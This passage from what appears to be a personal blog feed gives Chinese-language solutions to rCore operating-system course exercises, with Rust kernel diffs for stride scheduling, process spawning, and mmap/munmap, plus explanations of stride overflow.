struct TaskControlBlockInner &#123;</span></span>@@ -68,6 +149,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -85,6 +178,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_zombie(&amp;self) -> bool &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.get_status() == TaskStatus::Zombie</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -118,6 +218,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -191,6 +295,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -206,6 +314,55 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p>stride 算法原理非常简单，但是有一个比较大的问题。例如两个 <code>pass = 10</code> 的进程，使用 8bit 无符号整型储存 stride， <code>p1.stride = 255, p2.stride = 250</code>，在 p2 执行一个时间片后，理论上下一次应该 p1 执行。</p><p><strong>Q1:</strong> 实际情况是轮到 p1 执行吗？为什么？ </p><p><strong>A1:</strong> 不是，对于 8 位无符号整型而言，它能够表示的最大整数为 255，因此当 p2 执行了一个时间片后，<code>p2.stride = p2.stride + pass = 250 + 10 = 4 (overflow!)</code> 。这样，下一次被调度的进程实际上还是 p2.</p><p>我们之前要求进程优先级 &gt;= 2 其实就是为了解决这个问题。可以证明，<strong>在不考虑溢出的情况下</strong>, 在进程优先级全部 &gt;= 2 的情况下，如果严格按照算法执行，那么 <code>STRIDE_MAX – STRIDE_MIN &lt;= BigStride / 2</code>.</p><p><strong>Q2:</strong> 为什么？尝试简单说明（不要求严格证明）。</p><p><strong>A2:</strong> 进程优先级 &gt;= 2，则有 <code>pass &lt;= BigStride / 2</code>，由于调度策略的影响，最大步长与最小步长的差值最大不超过 pass，那么便有 <code>STRIDE_MAX – STRIDE_MIN &lt;= pass &lt;= BigStride / 2</code>.</p><p><strong>Q3:</strong> 已知以上结论，<strong>考虑溢出的情况下</strong>，可以为 Stride 设计特别的比较器，让 <code>BinaryHeap&lt;Stride&gt;</code> 的 pop 方法能返回真正最小的 Stride。补全下列代码中的 <code>partial_cmp</code> 函数，假设两个 Stride 永远不会相等。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p> TIPS: 使用 8 bits 存储 stride, BigStride = 255, 则: <code>(125 &lt; 255) == false</code>, <code>(129 &lt; 255) == true</code>.</p></blockquote><p><strong>A3:</strong> </p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> half <span class="token operator">=</span> <span class="token class-name">BigStride</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;</span> other<span class="token number">.0</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> other<span class="token number">.0</span> <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">-</span> other<span class="token number">.0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter4练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-01T15:30:11.000Z</published>
    <updated>2024-11-04T11:43:33.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="重写-sys-get-time-和-sys-task-info"><a href="#重写-sys-get-time-和-sys-task-info" class="headerlink" title="重写 sys_get_time 和 sys_task_info"></a>重写 <code>sys_get_time</code> 和 <code>sys_task_info</code></h3><p>首先，第一个任务：由于引入了虚拟内存后，<code>sys_get_time</code> 和 <code>sys_task_info</code> 失效了，需要进行重写。</p><p>这里解释一下为什么会失效：以 <code>sys_get_time</code> 为例，用户在发起系统调用时，传入的参数 <code>_ts</code> 是用户态下的虚拟地址，它需要借助内核的软件地址转换机制，查找任务对应的页表，将 <code>_ts</code> 转换为物理地址，再对该地址处的值进行填充。这里可以使用 <code>page_table.rs</code> 中预先实现好的 <code>translated_byte_buffer</code>，它将一整个虚拟地址段翻译为一系列的物理地址段（每页一段），这样如果结构体 <code>TimeVal</code> 和 <code>TaskInfo</code> 横跨多个页面也同样适用。</p><blockquote><p>注意，内核态代码中的地址仍然是虚拟地址，只不过在 rCore 中，内核态的低 256GB 为直接映射，因此好像内核代码在直接访问物理地址，其实还是虚拟地址。</p></blockquote><h3 id="实现-mmap"><a href="#实现-mmap" class="headerlink" title="实现 mmap"></a>实现 <code>mmap</code></h3><p>POSIX 标准中的 <code>mmap</code> 是将一个文件或其他对象的数据映射到进程的地址空间中，而本实验需实现的 <code>mmap</code> 则为简化版本，只是简单地向进程地址空间中插入一段虚拟内存段，而无需为其设置初始值。</p><p>在尝试进行 <code>mmap</code> 之前，需要检查可能发生的错误。按照手册的提示，可能的错误如下：</p><ul><li>start 没有按页大小对齐</li><li><code>port &amp; !0x7 != 0</code> (port 其余位必须为0)</li><li><code>port &amp; 0x7 = 0</code> (这样的内存无意义)</li><li><code>[start, start + len)</code> 中存在已经被映射的页</li><li>物理内存不足</li></ul><p>前三个错误很容易判断，如下所示，在此不必赘述。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 1. illegal start virtual address or port</span><span class="token keyword">if</span> <span class="token operator">!</span>start_va<span class="token punctuation">.</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token operator">!</span><span class="token number">0x7</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token number">0x7</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>物理内存是否充足，需要判断尝试映射的内存长度与空闲物理内存的大小关系。rCore 所采用的物理内存策略是简单的栈式分配器，剩余物理内存大小等于 <code>end - current</code> 加上 <code>recycled.len()</code>.</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Check if the remaining physical memory is sufficient</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">is_mem_sufficient</span><span class="token punctuation">(</span>_len<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> fa <span class="token operator">=</span> <span class="token constant">FRAME_ALLOCATOR</span><span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> page_cnt <span class="token operator">=</span> fa<span class="token punctuation">.</span>end <span class="token operator">-</span> fa<span class="token punctuation">.</span>current <span class="token operator">+</span> fa<span class="token punctuation">.</span>recycled<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>_len <span class="token operator">+</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">&lt;=</span> page_cnt<span class="token punctuation">&#125;</span></code></pre><p>要判断一段虚拟内存段是否存在已被映射的页面，需要遍历每个页面的起始地址，使用软件地址转换机制尝试对该虚拟地址进行“翻译”，如果成功得到对应的页表项，则说明虚拟页面已被映射，<code>mmap</code> 出错。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 3. Check if trying to map mapped page</span><span class="token keyword">for</span> vpn <span class="token keyword">in</span> vpn_range <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>pte<span class="token punctuation">)</span> <span class="token operator">=</span> inner<span class="token punctuation">.</span>tasks<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">.</span>memory_set<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span>vpn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> pte<span class="token punctuation">.</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>检查完所有可能的错误之后，便可以开始进行实际的页面映射了。实际上，在 rCore 中，一个地址空间由若干个逻辑段（<code>MapArea</code>）组成，想要将一段虚拟内存段插入地址空间中，只需要根据 <code>sys_mmap</code> 的参数 start, len, port 构建一个 <code>MapArea</code> 数据结构，再将其插入 <code>memory_set.areas</code> 中（页表项的插入会同时实现）。实际上，rCore 中提供了这样的接口：<code>insert_framed_area</code>。</p><h3 id="实现-munmap"><a href="#实现-munmap" class="headerlink" title="实现 munmap"></a>实现 <code>munmap</code></h3><p>与 <code>mmap</code> 一样，首先检查可能的错误：<code>[start, start + len)</code> 中存在未被映射的虚存，实现方式与 <code>mmap</code> 一样，在此不再介绍。</p><p>实际上，严格的 <code>munmap</code> 实现并不简单，需要考虑将原有的 <code>memeort_set.areas</code> 中的 <code>MapArea</code> 进行进行分割处理。在这里，为了实现的简单，假设 <code>[start, start + len)</code> 正好为一个完整的逻辑段，而非一个更大逻辑段的一部分（测试样例中没有这种情况）。有了这个简化，<code>munmap</code> 就很简单了：只需遍历 <code>memory_set.areas</code> 的各个逻辑段 <code>area</code>，当找到指定逻辑段时，使用 <code>area.unmap()</code> 移除对应的页表项映射，最后将 <code>area</code> 从 <code>memory_set.areas</code> 中移除。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove framed area</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">remove_framed_area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> range<span class="token punctuation">:</span> <span class="token class-name">VPNRange</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> area <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span>         <span class="token operator">&amp;&amp;</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">&#123;</span>            area<span class="token punctuation">.</span><span class="token function">unmap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">.</span>page_table<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 01e62fd..e916f1e 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -2,7 +2,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -117,6 +117,13 @@ pub fn frame_dealloc(ppn: PhysPageNum) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    FRAME_ALLOCATOR.exclusive_access().dealloc(ppn);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(unused)]</span><span class="token prefix unchanged"> </span><span class="token line">/// a simple test for frame allocator</span><span class="token prefix unchanged"> </span><span class="token line">pub fn frame_allocator_test() &#123;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex 7a7b7ea..fca0b7f 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -63,6 +63,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                